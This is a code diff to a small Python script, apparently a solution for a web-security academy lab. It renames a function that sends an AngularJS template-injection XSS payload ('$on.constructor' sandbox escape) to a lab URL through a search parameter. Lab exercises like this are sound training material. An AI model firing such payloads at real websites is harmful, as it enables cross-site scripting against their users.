@@ -1,7 +1,7 @@
 import requests
 
 
-def send_exploit(url, payload):
+def injection(url, payload):
   
     URL = f"{url}?search={payload}"
     headers = {
@@ -22,4 +22,4 @@ def send_exploit(url, payload):
 if __name__ == "__main__":
     target_url = "https://LAB-ID.web-security-academy.net/" #put the lab-id here
     xss_payload = "{{ $on.constructor('alert(1)')() }}"
-    send_exploit(target_url, xss_payload)
+    injection(target_url, xss_payload)
